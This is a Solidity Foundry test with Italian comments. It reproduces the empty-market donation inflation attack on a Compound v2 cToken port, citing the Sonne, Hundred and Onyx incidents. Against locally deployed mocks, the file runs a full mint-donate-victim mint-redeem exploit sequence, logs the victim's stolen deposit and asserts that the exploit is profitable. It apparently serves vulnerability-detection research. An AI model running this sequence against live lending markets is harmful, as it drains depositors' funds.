// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// EXEC-GATE SOUND su CODICE-INCIDENTE REALE: il VERO Compound v2 cToken (CErc20/CToken, lo stesso codice
// forkato da Sonne $20M / Hundred $7.4M / Onyx $2.1M). Attacco empty-market FEDELE (mint-tiny -> donate ->
// victim-mint -> redeem) chiamato sull'ABI reale, mock minimi per Comptroller/IRM. Profit firmato in underlying.
// NON il path LLM-PoC fragile: il gate sound (FP=0 per costruzione) adjudica la PREDA REALE.
import "forge-std/Test.sol";
import {MockToken} from "../src/Targets.sol";
import "../incident/CompoundReal.sol";   // Compound v2 0.8.10-port REALE (codice Sonne/Hundred/Onyx), riordinato

contract MockComptroller is ComptrollerInterface {
    function enterMarkets(address[] calldata) external override returns (uint[] memory r) { r = new uint[](0); }
    function exitMarket(address) external override returns (uint) { return 0; }
    function mintAllowed(address, address, uint) external override returns (uint) { return 0; }
    function mintVerify(address, address, uint, uint) external override {}
    function redeemAllowed(address, address, uint) external override returns (uint) { return 0; }
    function redeemVerify(address, address, uint, uint) external override {}
    function borrowAllowed(address, address, uint) external override returns (uint) { return 0; }
    function borrowVerify(address, address, uint) external override {}
    function repayBorrowAllowed(address, address, address, uint) external override returns (uint) { return 0; }
    function repayBorrowVerify(address, address, address, uint, uint) external override {}
    function liquidateBorrowAllowed(address, address, address, address, uint) external override returns (uint) { return 0; }
    function liquidateBorrowVerify(address, address, address, address, uint, uint) external override {}
    function seizeAllowed(address, address, address, address, uint) external override returns (uint) { return 0; }
    function seizeVerify(address, address, address, address, uint) external override {}
    function transferAllowed(address, address, address, uint) external override returns (uint) { return 0; }
    function transferVerify(address, address, address, uint) external override {}
    function liquidateCalculateSeizeTokens(address, address, uint) external view override returns (uint, uint) { return (0, 0); }
}

contract MockIRM is InterestRateModel {
    function getBorrowRate(uint, uint, uint) external pure override returns (uint) { return 0; }
    function getSupplyRate(uint, uint, uint, uint) external pure override returns (uint) { return 0; }
}

contract CTokenGate is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);

    function _deploy() internal returns (CErc20Immutable ct, MockToken u) {
        u = new MockToken();
        MockComptroller comp = new MockComptroller();
        MockIRM irm = new MockIRM();
        // initialExchangeRateMantissa = 2e26 (standard Compound per underlying 18-dec / cToken 8-dec)
        ct = new CErc20Immutable(address(u), comp, irm, 2e26, "cReal", "cR", 8, payable(address(this)));
    }

    function _attack(uint256 mintDust, uint256 V, uint256 D) internal returns (int256 profit, uint256 vicTokens) {
        (CErc20Immutable ct, MockToken u) = _deploy();
        u.mint(atk, mintDust + D);
        u.mint(vic, V);
        vm.startPrank(atk);
        u.approve(address(ct), type(uint256).max);
        ct.mint(mintDust);                       // attaccante: pochi cToken al rate iniziale
        u.transfer(address(ct), D);              // DONAZIONE diretta: gonfia getCash, totalSupply invariato
        vm.stopPrank();
        vm.startPrank(vic);
        u.approve(address(ct), type(uint256).max);
        ct.mint(V);                              // vittima deposita V (mintTokens = div_(V, exchangeRate gonfiato))
        vm.stopPrank();
        vicTokens = ct.balanceOf(vic);           // ~0 => inflation colpisce (nessun guard ZERO_SHARES in Compound)
        vm.startPrank(atk);
        ct.redeem(ct.balanceOf(atk));            // attaccante redime: ottiene ~tutto il cash
        vm.stopPrank();
        profit = int256(u.balanceOf(atk)) - int256(mintDust + D);
    }

    function testRealCompoundInflation() public {
        uint256 mintDust = 4e8;                  // -> ~2 cToken al rate iniziale 2e26
        uint256 V = 100e18;
        uint256[5] memory Ds = [uint256(1e20), 1e21, 1e22, 1e24, 1e26];
        int256 maxP = type(int256).min; uint256 bestD; uint256 victimZeroAt;
        for (uint256 i = 0; i < 5; i++) {
            (int256 p, uint256 vt) = _attack(mintDust, V, Ds[i]);
            if (p > maxP) { maxP = p; bestD = Ds[i]; }
            if (vt == 0 && victimZeroAt == 0) victimZeroAt = Ds[i];
        }
        emit log_named_int("max_attacker_profit_underlying_wei", maxP);
        emit log_named_uint("witness_donation_D", bestD);
        emit log_named_uint("victim_got_zero_at_D", victimZeroAt);
        emit log_named_uint("victim_deposit_stolen", uint256(maxP > 0 ? maxP : int256(0)));
        if (maxP > 0)
            emit log_string(string.concat("RESULT compound_real_cToken VULN maxProfit=", vm.toString(maxP), " witness=", vm.toString(bestD)));
        else
            emit log_string("RESULT compound_real_cToken IMMUNE");
        // CATTURA REALE: il vero codice Compound (classe Sonne/Hundred/Onyx) DEVE essere catturato dal gate sound
        assertGt(maxP, int256(0), "il vero Compound cToken empty-market DEVE essere sfruttabile per esecuzione");
    }
}
